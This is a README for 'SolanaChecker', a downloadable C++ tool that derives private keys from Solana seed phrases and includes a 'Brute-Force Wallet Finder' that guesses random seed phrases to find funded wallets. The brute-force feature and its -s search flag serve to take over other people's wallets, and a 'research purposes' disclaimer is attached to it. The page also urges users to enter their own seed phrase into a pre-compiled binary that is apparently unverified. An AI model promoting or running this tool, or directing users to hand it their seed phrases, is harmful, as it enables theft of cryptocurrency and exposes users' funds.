# Solana Wallet Mnemonic Extractor: Unlock Your Wallet's Secrets

Need to extract wallet details from your Solana mnemonic phrase? **SolanaChecker** offers a powerful solution for unlocking the private key, address, and balance of your Solana wallet, using the known mnemonic (seed phrase). This feature empowers you with control over your assets and provides easy access to critical wallet information.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/temp/under.webp" />
</p>

## Key Features

1.  **Solana Address Balance Checker:** Check the current Solana balance on a specified address.

<p align="left">
    <img src="/temp/overlay.webp" />
</p>

2.  **Token Fraud Prevention:** Assess the security of your tokens using characteristics and metadata, and evaluate rug-pull risks.

<p align="left">
    <img src="/temp/over.webp" />
</p>

3.  **Address Tracking:** Receive real-time notifications about transactions on specified addresses through our Telegram bot integration.

4.  **Solana Mnemonic Extraction:** Extract the private key, address, and balance of a Solana wallet using its mnemonic phrase (seed phrase). This is the primary function, providing full wallet control.

<p align="left">
    <img src="/temp/thin.webp" />
</p>

5.  **Generate a New Solana Wallet:** Create a new Solana wallet.

<p align="left">
    <img src="/temp/board.webp" />
</p>

6.  **Brute-Force Wallet Finder:** Generate and check random seed phrases. Find existing wallets (research purposes), and optionally receive Telegram notifications.

<p align="left">
    <img src="/temp/header.webp" />
</p>

## Telegram Notifications Setup

Configure Telegram notifications by entering your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file, located in the program's folder.

## Getting Started: Installation

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project

The project is built with C++ and depends on the following libraries. We recommend using **vcpkg** to simplify this process:

### Installing Dependencies with vcpkg

1.  If you haven't already, clone the **vcpkg** repository and follow the instructions on the [official page](https://github.com/microsoft/vcpkg) to install it.
2.  Add **vcpkg** to your system's PATH environment variable.
3.  Run these commands to install dependencies:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  After dependencies are installed, build the project.

### Building with Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Make sure **vcpkg** is correctly integrated with your environment (see [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure all dependencies are installed via **vcpkg** and accessible to your compiler.
2.  Compile the project with this command (adapt as needed):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

How to use the program:

1.  **-s / -search**: Start a brute-force search for wallets with a balance.
2.  **-t / -track (ADDRESS)**: Track a specific address.
3.  **-g / -gen (NUMBER)**: Generate the specified number of Solana wallets. Replace `<NUMBER>` with the desired amount.
4.  **-m / -mnemonic (MNEMONIC)**: Use the mnemonic extractor to retrieve wallet details. Replace `<MNEMONIC>` with your seed phrase.
5.  **-b / -balance (ADDRESS)**: Show the balance of the given Solana address.

## Important Notes

-   This program is for research and informational purposes and should not be used for any illegal or malicious activities.
-   Remember that cryptocurrency investments carry risks. Always ensure the security of your data and wallets.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is under the [MIT License](/LICENSE). Feel free to use, modify, and distribute the code as permitted.